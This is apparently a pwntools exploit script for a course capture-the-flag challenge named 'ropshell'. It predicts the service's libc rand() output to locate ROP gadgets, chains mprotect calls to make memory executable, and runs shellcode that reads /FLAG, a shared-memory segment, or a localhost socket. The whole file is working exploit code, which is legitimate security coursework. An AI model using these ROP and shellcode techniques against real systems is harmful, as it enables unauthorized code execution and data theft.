#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import re
import ctypes

endian = 'little'
def b(number):
    return number.to_bytes(8, byteorder=endian)

LEN_CODE = (10*0x10000)
LEN_STACK = 8192

libc = ctypes.CDLL('libc.so.6')

context.arch = 'amd64'
context.os = 'linux'

pop_rax = b'X\xc3'#asm("""pop rax
                  #       ret""")
pop_rdi = b'_\xc3'#asm("""pop rdi
                  #ret""")
pop_rsi = b'^\xc3' #asm("""pop rsi
                   #ret""")
pop_rdx = b'Z\xc3'#asm("""pop rdx
                  #ret""")
syscall = b'\x0f\x05\xc3'#asm("""syscall
                         #ret""")
jmp_rsp = b'\xFF\xE4' # asm("jmp rsp")


r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    #r = gdb.debug('./ropshell', 'break main')
    r = process("./ropshell", shell=False)
    gdb.attach(r, '''
                break read
                set follow-fork-mode child
                continue
                ''')
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)


r.recvuntil(b'Timestamp is ');
seed = int(r.recvuntil(b'\n').decode().strip())
print(f'seed:{seed}')
r.recvuntil(b'Random bytes generated at ')
code_address = int(r.recvuntil(b'\n').decode().strip(),base=16)
print(f'code address:{hex(code_address)}')
stack_address = code_address - 0x2000
print(f'stack address:{hex(stack_address)}')
libc.srand(seed)

code = bytearray(LEN_CODE)
codeint = memoryview(code).cast('I')

for i in range(LEN_CODE // 4):
    codeint[i] = ctypes.c_uint32((libc.rand() << 16) | (libc.rand() & 0xffff)).value

pos = ctypes.c_uint32(libc.rand() % (LEN_CODE // 4 - 1)).value
codeint[pos] = 0xc3050f


pop_rax_address = code.find(pop_rax)+code_address
pop_rdi_address = code.find(pop_rdi)+code_address
pop_rsi_address = code.find(pop_rsi)+code_address
pop_rdx_address = code.find(pop_rdx)+code_address
syscall_address = code.find(syscall)+code_address
jmp_rsp_address = code.find(jmp_rsp)+code_address

# exit(37)
# -> mov rax 60
# -> mov rdi 37
# -> syscall
# -> ret
#exit = (b(pop_rax_address)+
#        b(60)+
#        b(pop_rdi_address)+
#        b(37)+
#        b(syscall_address))
exit = asm("""mov rax, 60
            mov rdi, 37
            syscall
            ret""")

# mprotect(base, LEN_CODE, PROT_READ|PROT_WRITE|PROT_EXEC)
turnon_codewrite = (b(pop_rax_address)+
                    b(10)+
                    b(pop_rdi_address)+
                    b(code_address)+
                    b(pop_rsi_address)+
                    b(LEN_CODE)+
                    b(pop_rdx_address)+
                    b(7)+
                    b(syscall_address)
)

turnon_stackexecute = (b(pop_rax_address)+
                       b(10)+
                       b(pop_rdi_address)+
                       b(stack_address)+
                       b(pop_rsi_address)+
                       b(LEN_STACK)+
                       b(pop_rdx_address)+
                       b(7)+
                       b(syscall_address)
)


# %rax = syscall(%rdi, %rsi, %rdx)
# fd = open("/FLAG", O_RDONLY = 0)
# size = read(fd, buf, 0x100)
# write(2, buf, size)
get_file_flag = asm(f"""
   mov rax, 2                       # open syscall code = 2
   lea rdi, [rip+.filename]         # "/FLAG"
   mov rsi, 0                       # O_RDONLY = 0
   syscall
   mov rdi, rax                     # fd
   mov rax, 0                       # read syscall code = 2
   mov rsi, {hex(stack_address)}    # buf
   mov rdx, 0x100                   # 0x100
   syscall
   mov rdx, rax                     # size
   mov rax, 1                       # write syscall code = 1
   mov rdi, 2                       # stderr
   mov rsi, {hex(stack_address)}    # buf
   syscall
   mov rax, 60                      # exit syscall code = 60
   mov rdi, 37                      # exit(37)
   syscall
.filename:
   .ascii "/FLAG"
""")

# %rax = syscall(%rdi, %rsi, %rdx)
# shmid = sys_shmget(0x1337, size = 0 /*0 mean get exist*/, shmflg = NULL)
# buf = sys_met(shmid, shmaddr=NULL, shmflg=SHM_RDONLY(0x1000))
# sys_write(2, buf, size)
get_shared_memory_flag = asm(f"""
       mov rax, 29          # shmget syscall code = 29
       mov rdi, 0x1337      # shm_key
       mov rsi, 0           # size
       mov rdx, 0           # smflg
       syscall
       mov rdi, rax         # shmid
       mov rax, 30          # shmmat syscall code = 30
       mov rsi, 0
       mov rdx, 0x1000
       syscall
       mov rsi, rax         # size
       mov rax, 1           # write syscall code = 1
       mov rdi, 2           # stderr
       mov rdx, 0x45        # sizeof(flag) = 0x45
       syscall
       mov rax, 60          # exit
       mov rdi, 37          # exit(37)
       syscall
""")
                             
# %rax = syscall(%rdi, %rsi, %rdx)
# fd = sys_socket(family = AF_INET(2), type = SOCK_STREAM(1),  protocol=0)
# sys_connect(fd, (sockaddr*)&servaddr, sizeof(servaddr) = 16);
# size = read(fd, buf, 0x100)
# sys_write(2, buf, size)
get_server_flag = asm(f"""
    mov rax, 41                     # socket syscall code = 41
    mov rdi, 2                      # AF_INET
    mov rsi, 1                      # SOCK_STREAM
    mov rdx, 0                      # protocol
    syscall
    mov rdi, rax                    # fd
    mov rax, 42                     # connect syscall code = 42
    mov rsi, {hex(stack_address)}   # servaddr\
        # struct sockaddr_in\
        # (2bytes) short            sin_family = AF_INET\
        # (2bytes) unsigned short   sin_port =  htons(0x1337) = 0x7713\
        # (4bytes) struct in_addr   sin_addr = "127.0.0.1"\
        # (8bytes) char             sin_zero[8]
        mov WORD PTR[rsi], 2                # sin_family
        mov WORD PTR[rsi+2], 0x3713         # sin_port
        mov DWORD PTR[rsi+4], 0x0100007f    # sin_addr\
        # mov QWORD PTR[rsi+12], 0          # sin_zero\
        # movabs r8, 0x100007F37130002\
        # mov [rsi], r8
    mov rdx, 0x10 # sizeof(servaddr) = 16
    syscall
    mov rax, 0                      # read syscall code = 2
    mov rsi, {hex(stack_address)}   # buf
    mov rdx, 0x100                  # size
    syscall
    mov rdx, rax                    # size
    mov rax, 1                      # write syscall code = 1
    mov rdi, 2                      # stderr
    mov rsi, {hex(stack_address)}   # buf
    syscall
    mov rax, 60                     # exit
    mov rdi, 37 
    syscall
""")

#write_test = asm(f"""
#                    mov rdx, 0x05 # size
#                    mov rax, 0x01  # write syscall code = 1
#                    mov rdi, 0x02  # stderr
#                    lea rsi, [rip+.str]
#                    syscall
#                    mov rax, 60 
#                    mov rdi, 37
#                    syscall # exit
#                 .str:
#                    .ascii "hellow world!!"
#                    """
#)


print(f'stack next:{hex(stack_address+LEN_STACK//2+19*8)}')


def sendShell(code:bytes):
    r.sendafter(b'shell> ',code)
    print(r.recvuntil(b'received.\n'))
    print(r.recvuntil(b'\n'))
    print(r.recvuntil(b'\n\n'))

#sendShell(turnon_codewrite+turnon_stackexecute+b(jmp_rsp_address)+get_file_flag)
#sendShell(turnon_codewrite+turnon_stackexecute+b(jmp_rsp_address)+get_shared_memory_flag)
sendShell(turnon_codewrite+turnon_stackexecute+b(jmp_rsp_address)+get_server_flag )

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :